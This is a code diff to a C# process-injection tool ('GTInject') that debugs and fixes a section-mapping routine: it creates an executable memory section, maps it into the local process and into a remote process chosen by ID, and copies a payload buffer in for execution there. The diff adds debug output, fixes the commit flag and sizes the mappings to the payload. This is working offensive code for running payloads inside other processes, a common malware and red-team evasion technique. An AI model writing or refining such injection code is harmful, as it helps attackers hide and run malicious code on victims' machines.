@@ -68,31 +68,38 @@ namespace GTInject.memoryOptions
             int len = plainBytes.Length;
             uint bufferLength = (uint)len;
             IntPtr sectionHandler = new IntPtr();
-            long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(AllocationType.Commit), IntPtr.Zero);
-
-
+            Console.WriteLine(  " section perms value : " + (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE));
+            long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
+            Console.WriteLine(  " createsection long resp : " + createSection);
+            Console.WriteLine(  " section handler : " + sectionHandler);
             // Map the new section for the LOCAL process.
             IntPtr localBaseAddress = new IntPtr();
-            int sizeLocal = 4096;
+            int sizeLocal = plainBytes.Length;
             ulong offsetSectionLocal = new ulong();
 
             Process localProc = Process.GetCurrentProcess();
-            long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE));
-
+            long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
+            Console.WriteLine(  " local section mapped : long resp : " + mapSectionLocal);
+            Console.WriteLine(  " local base address " + localBaseAddress);
 
             // Map the new section for the REMOTE process.
             IntPtr remoteBaseAddress = new IntPtr();
-            int sizeRemote = 4096;
+            int sizeRemote = plainBytes.Length;
             ulong offsetSectionRemote = new ulong();
 
             Process remoteProc = Process.GetProcessById(ProcID);
 
             long mapSectionRemote = NtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
+            Console.WriteLine(  " mapSectionRemote resp : " + mapSectionRemote);
+            Console.WriteLine(  " remoteBaseAddress " + remoteBaseAddress);
 
-            // RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
+            //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
+            Console.WriteLine(  " created unmanaged ptr " + unmanagedPointer);
             Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
+            Console.WriteLine(  " marshal copied to unmgd ptr ");
             RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+            Console.WriteLine( " RtlCopyMemory execd");
             Marshal.FreeHGlobal(unmanagedPointer);
 
             return (remoteBaseAddress, remoteProc);
@@ -135,6 +142,9 @@ namespace GTInject.memoryOptions
         /////////////////////////////////////
         // PInvokes and Enums / Structures
         /////////////////////////////////////
+
+        //https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
+        private static readonly uint SEC_COMMIT = 0x8000000;
 
         [Flags]
         public enum NtSectionPerms
